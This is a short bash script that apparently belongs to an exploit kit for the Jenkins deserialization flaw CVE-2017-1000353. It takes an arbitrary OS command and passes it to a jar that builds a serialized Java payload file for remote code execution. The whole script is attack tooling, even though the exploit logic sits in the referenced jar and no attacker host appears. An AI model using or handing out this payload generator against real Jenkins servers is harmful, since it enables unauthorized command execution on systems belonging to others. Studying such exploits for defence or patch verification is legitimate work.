#!/bin/bash

command="$1"

if [ -z "$command" ]; then
	echo "[*] Usage: $0 <os command>"
    exit 1
fi

java -jar ./eclipse_project/bin/jenkins-cve-2017-1000353.jar java_serialization_data.bin "$command"
